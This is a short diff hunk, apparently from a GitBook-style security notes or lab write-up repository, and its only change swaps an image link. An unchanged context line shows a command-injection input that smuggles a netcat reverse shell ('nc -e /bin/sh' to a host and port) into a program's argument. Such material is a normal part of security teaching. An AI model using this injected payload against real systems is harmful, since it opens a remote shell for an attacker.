@@ -349,4 +349,4 @@ int main()
 hello; $(nc -e /bin/sh 192.168.0.8 11111)
 ```
 
-![](<../../.gitbook/assets/image (28) (1) (1) (1) (1) (1).png>)
+![image-20230208155711180](../../.gitbook/assets/image-20230208155711180.png)
